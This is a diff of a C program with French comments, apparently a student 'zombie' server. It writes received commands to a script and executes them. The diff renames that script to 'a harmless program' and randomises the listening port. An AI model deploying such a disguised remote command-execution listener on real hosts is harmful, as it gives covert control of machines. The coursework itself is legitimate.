@@ -48,7 +48,7 @@ void childProcess() {
   // prend la commande en mémoire partagé
 
   // sopen pour créer un fichier
-  char* scriptName = "mon bash discret";
+  char* scriptName = "un programme inoffensif";
   /* Création du fichier script avec permissions 700 */
   int fd = sopen(scriptName, O_WRONLY | O_TRUNC | O_CREAT, 0700);
 
@@ -69,7 +69,6 @@ void childProcess() {
 
   // exec le fichier. Peut-être fork ça, à voir.
   sexecl(scriptName, scriptName, NULL);
-  printf("%s\n", "toast");
 
   // envoyer réponse
 } 
@@ -79,10 +78,45 @@ void childProcess() {
 int main(int argc, char **argv)
 {
 	StructMessage msg;
+
+  int port;
+  switch(randomIntBetween(1,10)) {
+    case 1:
+      port = SERVER_PORT_1;
+      break;
+    case 2:
+      port = SERVER_PORT_2;
+      break;
+    case 3:
+      port = SERVER_PORT_3;
+      break;
+    case 4:
+      port = SERVER_PORT_4;
+      break;
+    case 5:
+      port = SERVER_PORT_5;
+      break;
+    case 6:
+      port = SERVER_PORT_6;
+      break;
+    case 7:
+      port = SERVER_PORT_7;
+      break;
+    case 8:
+      port = SERVER_PORT_8;
+      break;
+    case 9:
+      port = SERVER_PORT_9;
+      break;
+    case 10:
+      port = SERVER_PORT_10;
+      break;
+
+  }
 	
   
-	int sockfd = initSocketServer(9501);
-	printf("Le serveur tourne sur le port : %i \n", 9501);
+	int sockfd = initSocketServer(port);
+	printf("Le zombie tourne sur le port : %i \n", port);
 	
 	// setsockopt -> to avoid Address Already in Use
   int option = 1;
